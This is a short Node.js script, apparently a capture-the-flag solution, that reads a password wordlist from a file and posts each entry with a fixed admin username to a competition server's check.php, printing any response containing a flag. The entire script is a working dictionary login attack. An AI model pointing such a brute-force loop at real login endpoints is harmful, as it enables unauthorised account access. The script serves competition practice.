const axios = require('axios');

async function checkPassword(password) {
    try {
        const response = await axios.post('http://chal.pctf.competitivecyber.club:9096/check.php', {
            password: password,
            name: 'adminjyu'
        });

        if (response.data.includes('PCTF{') || response.data.includes('pctf{') || response.data.includes('flag')) {
            console.log('Found flag:', response.data);
        }
    } catch (error) {
        console.error(`Error checking password: ${error.message}`);
    }
}

async function main() {
    // Charge le contenu de pass.txt
    const fs = require('fs');
    const passwords = fs.readFileSync('pass.txt', 'utf-8').split('\n');

    // Itère sur les mots de passe et les vérifie
    for (const password of passwords) {
        await checkPassword(password.trim());
    }
}

main();
